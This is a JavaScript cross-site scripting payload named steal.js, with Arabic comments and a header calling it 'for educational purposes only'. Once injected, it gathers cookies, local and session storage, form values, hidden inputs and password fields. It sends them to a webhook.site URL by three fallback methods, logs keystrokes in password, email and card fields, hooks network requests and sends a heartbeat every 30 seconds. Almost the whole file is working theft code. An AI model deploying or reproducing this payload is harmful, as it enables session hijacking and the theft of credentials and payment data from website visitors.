// steal.js - XSS Payload for Security Testing
// Repository: https://github.com/ahasM/ha
// Webhook: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
// For educational purposes only

(function() {
    'use strict';
    
    // ⚙️ الإعدادات
    const CONFIG = {
        WEBHOOK_URL: 'https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24',
        GITHUB_REPO: 'ahasM/ha',
        ATTACKER_ID: 'xss_demo_' + Math.random().toString(36).substr(2, 9),
        VERSION: '1.0'
    };
    
    // منع التنفيذ المتكرر
    if (window.__xss_executed) {
        console.warn('[XSS] Payload already executed, skipping...');
        return;
    }
    window.__xss_executed = true;
    
    console.log('[XSS] ===========================================');
    console.log('[XSS] 🔓 Payload loaded from:', CONFIG.GITHUB_REPO);
    console.log('[XSS] 🎯 Target:', window.location.href);
    console.log('[XSS] 📊 Webhook:', CONFIG.WEBHOOK_URL);
    console.log('[XSS] 🕒 Time:', new Date().toLocaleString('ar-SA'));
    console.log('[XSS] ===========================================');
    
    // 📢 إشعار على الصفحة
    function showNotification() {
        try {
            const notification = document.createElement('div');
            notification.id = 'xss-notification';
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 15px 20px;
                border-radius: 12px;
                z-index: 2147483647;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                font-size: 14px;
                box-shadow: 0 8px 32px rgba(102, 126, 234, 0.4);
                max-width: 350px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255,255,255,0.2);
                animation: slideInXSS 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
                cursor: pointer;
            `;
            
            // إضافة أنيميشن
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideInXSS {
                    0% { transform: translateX(400px) rotate(10deg); opacity: 0; }
                    100% { transform: translateX(0) rotate(0); opacity: 1; }
                }
                @keyframes pulseXSS {
                    0% { box-shadow: 0 8px 32px rgba(102, 126, 234, 0.4); }
                    50% { box-shadow: 0 8px 42px rgba(102, 126, 234, 0.7); }
                    100% { box-shadow: 0 8px 32px rgba(102, 126, 234, 0.4); }
                }
            `;
            document.head.appendChild(style);
            
            notification.innerHTML = `
                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 8px;">
                    <div style="font-size: 24px;">⚠️</div>
                    <div style="font-weight: 700; font-size: 16px;">تنبيه أمني</div>
                </div>
                <div style="margin-bottom: 10px; line-height: 1.5; font-size: 13px;">
                    <div>تم اكتشاف ثغرة XSS في هذا الموقع</div>
                    <div style="opacity: 0.9; font-size: 12px; margin-top: 4px;">
                        مصدر الكود: <strong>${CONFIG.GITHUB_REPO}</strong>
                    </div>
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 11px; opacity: 0.7;">
                    <div>🆔 ${CONFIG.ATTACKER_ID}</div>
                    <div>🕒 ${new Date().toLocaleTimeString('ar-SA')}</div>
                </div>
            `;
            
            // إضافة تأثير نبض
            notification.addEventListener('mouseenter', () => {
                notification.style.animation = 'pulseXSS 1.5s infinite';
            });
            
            notification.addEventListener('mouseleave', () => {
                notification.style.animation = '';
            });
            
            // إغلاق الإشعار عند النقر
            notification.addEventListener('click', () => {
                notification.style.transition = 'all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
                notification.style.opacity = '0';
                notification.style.transform = 'translateX(400px) rotate(10deg)';
                setTimeout(() => {
                    if (notification.parentNode) {
                        notification.parentNode.removeChild(notification);
                    }
                }, 500);
            });
            
            document.body.appendChild(notification);
            
            // إزالة تلقائية بعد 15 ثانية
            setTimeout(() => {
                if (document.getElementById('xss-notification')) {
                    notification.click();
                }
            }, 15000);
            
        } catch(e) {
            console.error('[XSS] Error showing notification:', e);
        }
    }
    
    // 📊 جمع البيانات
    function collectData() {
        const data = {
            // معلومات الهجوم
            attack_info: {
                id: CONFIG.ATTACKER_ID,
                source: CONFIG.GITHUB_REPO,
                version: CONFIG.VERSION,
                webhook: CONFIG.WEBHOOK_URL,
                timestamp: new Date().toISOString(),
                execution_time: performance.now()
            },
            
            // معلومات الضحية
            victim_info: {
                url: window.location.href,
                domain: document.domain,
                title: document.title,
                referrer: document.referrer,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    color_depth: screen.colorDepth,
                    avail_width: screen.availWidth,
                    avail_height: screen.availHeight
                },
                cookies_enabled: navigator.cookieEnabled,
                online: navigator.onLine
            },
            
            // البيانات الحساسة
            sensitive_data: {
                cookies: document.cookie,
                local_storage: {},
                session_storage: {},
                forms: [],
                hidden_inputs: [],
                password_fields: []
            },
            
            // تحليل الصفحة
            page_analysis: {
                total_forms: 0,
                total_inputs: 0,
                total_links: 0,
                admin_links: [],
                search_fields: []
            }
        };
        
        // جمع localStorage
        try {
            const lsData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                lsData[key] = localStorage.getItem(key);
            }
            data.sensitive_data.local_storage = lsData;
        } catch(e) {}
        
        // جمع sessionStorage
        try {
            const ssData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                ssData[key] = sessionStorage.getItem(key);
            }
            data.sensitive_data.session_storage = ssData;
        } catch(e) {}
        
        // تحليل النماذج
        document.querySelectorAll('form').forEach((form, index) => {
            data.page_analysis.total_forms++;
            
            const formInfo = {
                index: index,
                id: form.id,
                name: form.name,
                action: form.action,
                method: form.method,
                inputs: []
            };
            
            form.querySelectorAll('input, textarea, select').forEach(input => {
                data.page_analysis.total_inputs++;
                
                const inputInfo = {
                    type: input.type,
                    name: input.name,
                    id: input.id,
                    class: input.className,
                    value: input.value,
                    placeholder: input.placeholder
                };
                
                formInfo.inputs.push(inputInfo);
                
                // اكتشاف الحقول الحساسة
                if (input.type === 'password') {
                    data.sensitive_data.password_fields.push(inputInfo);
                }
                
                if (input.type === 'hidden' && input.value && input.value.length > 10) {
                    data.sensitive_data.hidden_inputs.push({
                        name: input.name,
                        value_preview: input.value.substring(0, 100) + (input.value.length > 100 ? '...' : ''),
                        length: input.value.length
                    });
                }
                
                // اكتشاف حقول البحث
                const searchKeywords = ['search', 'بحث', 'query', 'q', 'keyword'];
                const inputName = (input.name || '').toLowerCase();
                const inputPlaceholder = (input.placeholder || '').toLowerCase();
                
                if (searchKeywords.some(keyword => 
                    inputName.includes(keyword) || 
                    inputPlaceholder.includes(keyword)
                )) {
                    data.page_analysis.search_fields.push({
                        form_action: form.action,
                        input_name: input.name,
                        placeholder: input.placeholder
                    });
                }
            });
            
            data.sensitive_data.forms.push(formInfo);
        });
        
        // تحليل الروابط
        document.querySelectorAll('a').forEach(link => {
            const href = link.href;
            const text = link.textContent.trim().substring(0, 100);
            
            if (href) {
                data.page_analysis.total_links++;
                
                // اكتشاف روابط الإدارة
                const adminPatterns = ['admin', 'dashboard', 'panel', 'control', 'manager', 'login', 'logout'];
                const arabicPatterns = ['إدارة', 'لوحة', 'تحكم', 'مدير', 'تسجيل', 'دخول', 'خروج'];
                
                const linkText = text.toLowerCase();
                const linkHref = href.toLowerCase();
                
                if (adminPatterns.some(pattern => linkHref.includes(pattern) || linkText.includes(pattern)) ||
                    arabicPatterns.some(pattern => linkText.includes(pattern))) {
                    
                    data.page_analysis.admin_links.push({
                        text: text,
                        href: href,
                        title: link.title
                    });
                }
            }
        });
        
        // معلومات إضافية
        data.metadata = {
            dom_elements: document.getElementsByTagName('*').length,
            scripts_count: document.scripts.length,
            stylesheets_count: document.styleSheets.length,
            images_count: document.images.length
        };
        
        return data;
    }
    
    // 📨 إرسال البيانات إلى Webhook
    function sendToWebhook(data) {
        const payload = {
            event: 'xss_data_collection',
            attacker: CONFIG.ATTACKER_ID,
            target_domain: document.domain,
            collected_data: data,
            collection_time: new Date().toISOString()
        };
        
        console.log('[XSS] 📤 Sending data to webhook...');
        
        // محاولات إرسال متعددة
        const sendAttempts = [
            // المحاولة الأولى: Fetch مباشر
            () => {
                return fetch(CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Attacker-ID': CONFIG.ATTACKER_ID,
                        'X-Source-Repo': CONFIG.GITHUB_REPO
                    },
                    body: JSON.stringify(payload)
                }).then(() => {
                    console.log('[XSS] ✅ Data sent via fetch (no-cors)');
                    return true;
                }).catch(e => {
                    console.log('[XSS] ❌ Fetch failed:', e.message);
                    return false;
                });
            },
            
            // المحاولة الثانية: Image beacon
            () => {
                try {
                    const img = new Image();
                    const encodedData = encodeURIComponent(JSON.stringify(payload).substring(0, 2000));
                    img.src = `${CONFIG.WEBHOOK_URL}?img_beacon=1&data=${encodedData}&id=${CONFIG.ATTACKER_ID}`;
                    console.log('[XSS] ✅ Image beacon sent');
                    return true;
                } catch(e) {
                    console.log('[XSS] ❌ Image beacon failed:', e.message);
                    return false;
                }
            },
            
            // المحاولة الثالثة: Form submission
            () => {
                try {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = CONFIG.WEBHOOK_URL;
                    form.style.display = 'none';
                    form.target = '_blank';
                    
                    const dataInput = document.createElement('input');
                    dataInput.type = 'hidden';
                    dataInput.name = 'xss_payload';
                    dataInput.value = JSON.stringify(payload);
                    form.appendChild(dataInput);
                    
                    const idInput = document.createElement('input');
                    idInput.type = 'hidden';
                    idInput.name = 'attacker_id';
                    idInput.value = CONFIG.ATTACKER_ID;
                    form.appendChild(idInput);
                    
                    document.body.appendChild(form);
                    form.submit();
                    
                    setTimeout(() => {
                        if (form.parentNode) {
                            form.parentNode.removeChild(form);
                        }
                    }, 1000);
                    
                    console.log('[XSS] ✅ Form submission sent');
                    return true;
                } catch(e) {
                    console.log('[XSS] ❌ Form submission failed:', e.message);
                    return false;
                }
            }
        ];
        
        // تنفيذ المحاولات بالتسلسل
        let attemptIndex = 0;
        function attemptSend() {
            if (attemptIndex < sendAttempts.length) {
                sendAttempts[attemptIndex]().then(success => {
                    if (!success && attemptIndex < sendAttempts.length - 1) {
                        attemptIndex++;
                        setTimeout(attemptSend, 1000);
                    }
                });
                attemptIndex++;
            }
        }
        
        attemptSend();
        
        // طباعة ملخص في الconsole
        console.log('[XSS] 📊 Data Summary:', {
            '🌐 Domain': data.victim_info.domain,
            '📝 Forms': data.page_analysis.total_forms,
            '⌨️ Inputs': data.page_analysis.total_inputs,
            '🔗 Links': data.page_analysis.total_links,
            '🔐 Passwords': data.sensitive_data.password_fields.length,
            '🎯 Admin Links': data.page_analysis.admin_links.length,
            '🔍 Search Fields': data.page_analysis.search_fields.length,
            '🍪 Cookies': data.sensitive_data.cookies ? 'Present' : 'None'
        });
    }
    
    // 🎯 Keylogger محدود للحقول الحساسة
    function setupKeylogger() {
        let capturedKeystrokes = [];
        
        document.addEventListener('keydown', function(e) {
            const target = e.target;
            const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA';
            
            if (isInput) {
                const fieldInfo = {
                    type: target.type,
                    name: target.name || 'unnamed',
                    id: target.id || 'no-id',
                    value: target.value
                };
                
                // تسجيل فقط للحقول الحساسة
                const isSensitive = target.type === 'password' || 
                                   (fieldInfo.name && (
                                       fieldInfo.name.toLowerCase().includes('pass') ||
                                       fieldInfo.name.toLowerCase().includes('user') ||
                                       fieldInfo.name.toLowerCase().includes('email') ||
                                       fieldInfo.name.toLowerCase().includes('card') ||
                                       fieldInfo.name.toLowerCase().includes('auth')
                                   ));
                
                if (isSensitive && e.key.length === 1) {
                    capturedKeystrokes.push({
                        key: e.key,
                        field: fieldInfo.name,
                        timestamp: Date.now(),
                        modifier: e.ctrlKey ? 'Ctrl+' : e.altKey ? 'Alt+' : e.shiftKey ? 'Shift+' : ''
                    });
                    
                    // إرسال كل 10 ضغطات
                    if (capturedKeystrokes.length >= 10) {
                        console.log('[XSS] 🔑 Keystrokes captured:', {
                            field: fieldInfo.name,
                            count: capturedKeystrokes.length,
                            sample: capturedKeystrokes.map(k => k.key).join('').substring(0, 20)
                        });
                        
                        // إرسال إلى webhook
                        if (capturedKeystrokes.length >= 20) {
                            sendToWebhook({
                                event: 'keystrokes_captured',
                                field: fieldInfo.name,
                                keystrokes: capturedKeystrokes,
                                partial_value: target.value.substring(0, 50)
                            });
                            capturedKeystrokes = [];
                        }
                    }
                }
            }
        });
    }
    
    // 🔍 اعتراض طلبات الشبكة
    function interceptNetworkRequests() {
        // اعتراض fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const [url, options = {}] = args;
            const startTime = Date.now();
            
            return originalFetch.apply(this, args).then(response => {
                const duration = Date.now() - startTime;
                
                // تسجيل الطلبات المهمة
                const urlStr = String(url);
                if (urlStr.includes('api') || urlStr.includes('token') || urlStr.includes('auth')) {
                    console.log('[XSS] 🌐 Fetch intercepted:', {
                        url: urlStr.substring(0, 100),
                        method: options.method || 'GET',
                        status: response.status,
                        duration: duration + 'ms'
                    });
                }
                
                return response;
            });
        };
        
        // اعتراض XMLHttpRequest
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._xhrMethod = method;
            this._xhrUrl = url;
            return originalOpen.apply(this, arguments);
        };
    }
    
    // 🚀 تهيئة الهجوم
    function initializeAttack() {
        console.log('[XSS] 🚀 Initializing XSS attack...');
        
        // 1. إظهار الإشعار
        setTimeout(showNotification, 500);
        
        // 2. جمع البيانات
        setTimeout(() => {
            const collectedData = collectData();
            
            // 3. إرسال البيانات
            sendToWebhook(collectedData);
            
            // 4. إضافة علامة مائية
            addWatermark();
            
        }, 2000);
        
        // 5. Keylogger
        setTimeout(setupKeylogger, 3000);
        
        // 6. اعتراض الشبكة
        setTimeout(interceptNetworkRequests, 4000);
        
        console.log('[XSS] ✅ Attack initialized successfully');
    }
    
    // 💧 إضافة علامة مائية
    function addWatermark() {
        try {
            const watermark = document.createElement('div');
            watermark.style.cssText = `
                position: fixed;
                bottom: 15px;
                left: 15px;
                background: rgba(0, 0, 0, 0.7);
                color: #00ff00;
                padding: 8px 12px;
                border-radius: 6px;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                z-index: 2147483646;
                border: 1px solid #00ff00;
                opacity: 0.8;
                pointer-events: none;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            `;
            watermark.innerHTML = `
                <div>🔓 XSS ACTIVE</div>
                <div style="font-size: 9px; opacity: 0.7;">${CONFIG.GITHUB_REPO}</div>
                <div style="font-size: 8px; opacity: 0.5;">${new Date().toLocaleTimeString('en-US', {hour12: false})}</div>
            `;
            document.body.appendChild(watermark);
        } catch(e) {}
    }
    
    // ⏱️ Heartbeat لإرسال تحديثات دورية
    function startHeartbeat() {
        setInterval(() => {
            const heartbeatData = {
                event: 'heartbeat',
                attacker_id: CONFIG.ATTACKER_ID,
                current_url: window.location.href,
                page_title: document.title,
                active_time: Math.floor(performance.now() / 1000) + 's',
                cookies_present: !!document.cookie
            };
            
            // إرسال heartbeat
            try {
                fetch(`${CONFIG.WEBHOOK_URL}?heartbeat=1`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(heartbeatData)
                });
            } catch(e) {}
            
            console.log('[XSS] 💓 Heartbeat sent');
            
        }, 30000); // كل 30 ثانية
    }
    
    // بدء كل شيء
    setTimeout(() => {
        initializeAttack();
        startHeartbeat();
    }, 1000);
    
})();

// Fallback بسيط
if (!window.__xss_executed) {
    console.log('[XSS] ⚡ Fallback executing...');
    alert('⚠️ XSS Vulnerability Detected\nSource: ahasM/ha');
}